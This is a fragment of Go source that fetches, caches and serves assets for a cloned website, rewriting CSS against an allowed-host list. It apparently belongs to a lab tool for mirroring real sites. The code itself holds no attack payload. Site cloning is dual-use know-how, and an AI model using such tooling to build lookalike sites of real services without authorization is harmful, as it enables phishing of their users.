	hash := sha256.Sum256([]byte(target.String()))
	key := hex.EncodeToString(hash[:])
	cachePath := filepath.Join(siteCacheDir(s.sitesDir(), manifest.Slug), key+".bin")
	metaPath := filepath.Join(siteCacheDir(s.sitesDir(), manifest.Slug), key+".json")
	data, readErr := os.ReadFile(cachePath)
	meta := siteAssetMeta{}
	if readErr == nil {
		if metaData, metaErr := os.ReadFile(metaPath); metaErr == nil {
			_ = json.Unmarshal(metaData, &meta)
		}
	} else {
		req, reqErr := http.NewRequestWithContext(r.Context(), http.MethodGet, target.String(), nil)
		if reqErr != nil {
			http.Error(w, "asset request failed", http.StatusBadGateway)
			return
		}
		req.Header.Set("User-Agent", "ENDGAME authorized lab site clone")
		resp, fetchErr := (&http.Client{Timeout: 30 * time.Second}).Do(req)
		if fetchErr != nil {
			http.Error(w, "asset request failed", http.StatusBadGateway)
			return
		}
		defer resp.Body.Close()
		if resp.StatusCode < 200 || resp.StatusCode >= 300 {
			http.Error(w, fmt.Sprintf("asset upstream HTTP %d", resp.StatusCode), http.StatusBadGateway)
			return
		}
		data, err = io.ReadAll(io.LimitReader(resp.Body, maxSiteAsset+1))
		if err != nil || len(data) > maxSiteAsset {
			http.Error(w, "asset too large", http.StatusBadGateway)
			return
		}
		meta.ContentType = resp.Header.Get("Content-Type")
		if meta.ContentType == "" {
			meta.ContentType = http.DetectContentType(data)
		}
		if strings.Contains(strings.ToLower(meta.ContentType), "text/css") {
			data = rewriteSiteCSS(data, manifest.Slug, target, manifestHostSet(manifest))
		}
		_ = os.MkdirAll(siteCacheDir(s.sitesDir(), manifest.Slug), 0700)
		_ = os.WriteFile(cachePath, data, 0600)
		metaData, _ := json.Marshal(meta)
		_ = os.WriteFile(metaPath, metaData, 0600)
	}
	if meta.ContentType != "" {
		w.Header().Set("Content-Type", meta.ContentType)
	}
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Header().Set("Cache-Control", "public, max-age=300")
	_, _ = w.Write(data)
}

func manifestHostSet(manifest siteManifest) map[string]bool {
	set := make(map[string]bool, len(manifest.AllowedHosts))
	for _, host := range manifest.AllowedHosts {
		set[strings.ToLower(host)] = true
	}
	return set
}
